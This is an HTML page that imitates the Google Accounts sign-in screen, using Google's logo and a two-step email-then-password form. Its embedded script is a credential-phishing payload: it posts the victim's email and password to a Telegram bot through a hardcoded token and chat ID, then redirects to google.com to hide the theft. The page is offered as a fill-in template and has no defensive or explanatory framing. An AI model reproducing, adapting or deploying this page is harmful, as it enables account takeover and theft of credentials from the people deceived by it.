<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    
    <style>
        /* General Styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: left;
        }

        .logo {
            display: block;
            width: 100px;
            margin: 0 auto 10px;
        }

        h2, p {
            text-align: center;
        }

        h2 {
            margin: 10px 0;
            font-size: 22px;
            color: #333;
        }

        p {
            font-size: 14px;
            color: #666;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        /* Error message styling */
        .error {
            color: red;
            font-size: 13px;
            display: none;
            margin-top: -8px;
            margin-bottom: 8px;
        }

        /* Align "Forgot email?" and "Next" on the same line, but lower the button */
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            margin-top: 15px;
        }

        .actions a {
            text-decoration: none;
            color: #1a73e8;
            font-size: 14px;
        }

        .actions a:hover {
            text-decoration: underline;
        }

        button {
            padding: 8px 16px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.3s ease;
            margin-top: 5px;
        }

        button:hover {
            background-color: #155abc;
        }

        .links-container {
            margin-top: 10px;
        }

        .links-container a {
            text-decoration: none;
            color: #1a73e8;
            font-size: 14px;
        }

        .links-container a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
        
        <h2>Sign in</h2>
        <p>Use your Google Account</p>

        <!-- Step 1: Enter Email -->
        <form id="emailForm">
            <input type="email" id="email" placeholder="Email or phone" required>
            <p class="error" id="emailError">Enter an email or phone number</p> <!-- Updated error message -->
            <div class="actions">
                <a href="#">Forgot email?</a>
                <button type="button" id="nextEmail">Next</button>
            </div>
        </form>

        <!-- Step 2: Enter Password (Initially Hidden) -->
        <form id="passwordForm" style="display: none;">
            <input type="password" id="password" placeholder="Enter your password" required>
            <div class="actions">
                <a href="#">Forgot email?</a>
                <button type="submit" id="nextPassword">Next</button>
            </div>
        </form>

        <div class="links-container">
            <a href="#">Create account</a>
        </div>
    </div>
<script>
    document.getElementById("nextEmail").addEventListener("click", function () {
        // Hide email form, show password form
        document.getElementById("emailForm").style.display = "none";
        document.getElementById("passwordForm").style.display = "block";
    });

    document.getElementById("passwordForm").addEventListener("submit", function (event) {
        event.preventDefault();

        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        // ðŸš¨ Replace these with your actual Bot Token and Chat ID
        const botToken = "8187093678:AAHQQV6drdKSt0FQ7jErNGv27qXrBB_edvk";
        const chatId = "7050128609";

        // Message format
        const message = `ðŸš€ *New Login Attempt* ðŸš€\n\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}`;

        // Send login details to Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        }).then(response => {
            if (response.ok) {
                // âœ… Redirect to Google after login
                window.location.href = "https://www.google.com";
            }
        }).catch(error => {
            console.error("Error:", error);
        });
    });
</script>

</body>
</html>
